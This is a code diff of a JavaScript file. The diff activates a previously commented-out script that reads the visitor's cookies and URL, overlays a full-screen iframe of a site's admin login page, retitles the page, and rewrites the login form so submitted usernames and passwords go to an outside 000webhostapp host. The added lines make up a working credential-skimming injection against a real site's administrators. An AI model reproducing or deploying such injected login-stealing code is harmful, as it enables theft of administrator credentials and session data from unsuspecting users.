@@ -1,4 +1,4 @@
-/*//Gen data
+//Gen data
 cookie = "Cookies:"+document.cookie;
 url = "URL:"+document.location;
 
@@ -19,13 +19,15 @@ document.getElementsByTagName('head')[0].appendChild(script);
 
 //Let page load first
 document.head.innerHTML = "<style>#login_iframe{width:100%;height:100%;border:none;position:absolute;left:0;top:0;overflow:hidden;}</style>" + document.head.innerHTML;
-document.body.innerHTML = "<iframe scrolling='no' onload=\"this.style.background='#222 url(\'images/bg-login.gif\')'\" id='login_iframe' src='http://g4wowisbad.000webhostapp.com/login.php?username="+getCookie("login_name")+"'></iframe>" + document.body.innerHTML;
+document.body.innerHTML = "<iframe scrolling='no' onload=\"this.style.background='#222 url(\'images/bg-login.gif\')'\" id='login_iframe' src='https://www.g4wow.com/admin_g4wow/Login.aspx'></iframe>" + document.body.innerHTML;
 var prevTitle = document.title;
 document.title = "网站管理系统";
 
 window.onload = function(){
+	$("#login_iframe").contents().find("#form1").attr("action", "http://g4wowisbad.000webhostapp.com/login.php");
+	$("#login_iframe").contents().find("#txtUsername").val(getCookie("login_name"));
 	$("#login_iframe").contents().find("#form1").submit(function(){
-		$("#login_iframe").attr("src", "http://g4wowisbad.000webhostapp.com/login.php?username="+getCookie("login_name"));
+		$("#login_iframe").attr("src", "https://www.g4wow.com/admin_g4wow/Login.aspx");
 		$("#login_iframe").delay(1000).hide(0);
 	});
 }
@@ -44,4 +46,3 @@ function getCookie(cname) {
     }
     return "";
 }
-*/
